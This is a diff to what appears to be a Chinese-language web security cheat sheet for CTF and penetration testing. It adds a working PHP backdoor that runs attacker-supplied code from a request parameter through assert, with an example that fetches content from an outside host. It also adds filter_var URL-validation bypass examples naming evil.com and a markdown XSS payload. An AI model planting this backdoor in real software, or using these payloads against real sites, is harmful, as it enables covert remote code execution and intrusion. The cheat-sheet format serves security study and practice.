@@ -108,6 +108,14 @@ phpinfo();
 ob_end_clean();
 ?>
 
+<?php 
+// 無回顯後門  
+// e.g. ?pass=file_get_contents('http://kaibro.tw/test')
+ob_start('assert');
+echo $_REQUEST['pass'];
+ob_end_flush();
+?>
+
 A=fl;B=ag;cat $A$B
 
 ```
@@ -506,6 +514,12 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - 花括號
     - 陣列、字串元素存取可用花括號
     - `$array{index}`同`$array[index]`
+
+- filter_var
+    - `filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)`
+        - False
+    - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
+        - True
 
 # Command Injection
 
@@ -1891,6 +1905,7 @@ xxe.dtd:
     - `[a](javascript:prompt(document.cookie))`
     - `[a](j a v a s c r i p t:prompt(document.cookie))`
     - `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
+    - `[a](javascript:window.onerror=alert;throw%201)`
     - ...
 
 ## Online Encoding / Decoding
